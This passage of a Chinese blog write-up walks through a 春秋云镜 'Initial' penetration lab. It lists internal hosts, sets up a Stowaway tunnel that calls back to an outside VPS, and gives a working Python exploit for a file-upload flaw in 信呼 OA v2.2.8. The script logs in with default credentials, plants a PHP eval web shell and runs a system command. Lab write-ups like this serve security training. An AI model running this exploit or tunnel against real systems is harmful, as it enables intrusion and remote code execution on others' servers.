+<li>172.22.1.21	XIAORANG-WIN7.xiaorang.lab MS17-010</li>
+<li>172.22.1.18        XIAORANG-OA01.xiaorang.lab 信呼协同办公系统</li>
+<li>172.22.1.2          DC:DC01.xiaorang.lab  </li>
+<li>172.22.1.15 	已拿下</li>
+</ul>
+<p>然后我们需要搭建内网代理</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_agent -c 124.223.25.186:1234 -s 123 --reconnect 8</span><br><span class="line"></span><br><span class="line">./linux_x64_admin -l 1234 -s 123</span><br><span class="line"></span><br><span class="line">use 0</span><br><span class="line"></span><br><span class="line">socks 5555</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251023180224039.png" alt="image-20251023180224039"></p>
+<p>然后我们物理机配置代理</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251023180408492.png" alt="image-20251023180408492"></p>
+<p>vps配置代理</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/1750329216655-cad2a2d0-d4c3-48be-9558-1f8b44995779.webp" alt="image.png"></p>
+<p>然后我们先打信呼OA</p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>访问信呼OA的地址172.22.1.18，302跳转到登录页面，显示信呼协同办公系统v2.2.8</p>
+<p>直接搜漏洞找到一个信呼协同办公系统v2.2.8文件上传漏洞</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;socks5://124.223.25.186:5555&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">session.post(url1, data=data1, proxies=proxy)</span><br><span class="line">res = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;, proxies=proxy)</span><br><span class="line">os.remove(<span class="string">&#x27;1.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(res.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = res.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">session.get(url3, proxies=proxy)</span><br><span class="line">res = session.post(url_pre + filepath,data=&#123;<span class="string">&quot;Infernity&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;, proxies=proxy)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/1749474496748-f250558f-feae-48f9-a126-3b7b5f92569e.webp" alt="image.png"></p>
+<p>然后用蚁剑连接一下，但是蚁剑也是需要配置代理的</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">2.</span> <span class="toc-text">flag1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fscan%E6%89%AB%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.1.</span> <span class="toc-text">fscan扫端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TPGUI%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="toc-number">2.2.</span> <span class="toc-text">TPGUI一把梭</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8getshell"><span class="toc-number">2.3.</span> <span class="toc-text">手动getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text">sudo提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网穿透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">4.</span> <span class="toc-text">flag2</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&text=春秋云镜Initial"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&title=春秋云镜Initial"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&is_video=false&description=春秋云镜Initial"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜Initial&body=Check out this article: https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&title=春秋云镜Initial"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&title=春秋云镜Initial"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&title=春秋云镜Initial"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&title=春秋云镜Initial"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&name=春秋云镜Initial&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/10/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/&t=春秋云镜Initial"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
